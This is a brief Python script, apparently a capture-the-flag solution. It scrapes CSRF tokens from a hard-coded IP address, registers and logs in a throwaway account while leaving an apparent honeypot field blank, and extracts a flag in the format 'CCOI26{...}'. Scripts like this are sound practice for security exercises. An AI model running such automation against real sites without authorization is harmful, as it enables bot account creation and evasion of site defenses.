import requests
import re

BASE = "http://95.216.124.220:31218"
s = requests.Session()

r = s.get(f"{BASE}/index.php")
csrf = re.search(r'csrf_token.*?value="([^"]+)"', r.text).group(1)

s.post(f"{BASE}/register.php", data={
    "csrf_token": csrf,
    "username":   "rogue",
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""
})

lp = s.get(f"{BASE}/login.php")
lcsrf = re.search(r'name="csrf_token" value="([^"]+)"', lp.text).group(1)
r2 = s.post(f"{BASE}/login.php", data={
    "csrf_token": lcsrf,
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""
}, allow_redirects=True)

flags = re.findall(r'CCOI26\{[^}]+\}', r2.text)
print(flags[0])
